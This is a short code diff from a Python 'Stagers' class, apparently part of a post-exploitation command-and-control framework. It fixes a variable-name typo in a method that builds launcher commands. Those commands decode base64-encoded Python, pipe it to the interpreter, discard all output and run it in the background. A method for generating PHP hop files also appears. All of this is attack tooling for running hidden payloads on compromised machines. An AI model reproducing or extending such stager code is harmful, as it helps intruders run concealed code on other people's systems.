@@ -278,7 +278,7 @@ class Stagers:
             # launcher = "python -c \"import sys,base64;exec(base64.b64decode('%s'));\"" %(launchEncoded)
             launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &>/dev/null &" % (launchEncoded)
         else:
-            launcher = "echo \"%s\" | python &>/dev/null &" % (launchBase)
+            launcher = "echo \"%s\" | python &>/dev/null &" % (launcherBase)
         return launcher
 
     def generate_hop_php(self, server, resources):
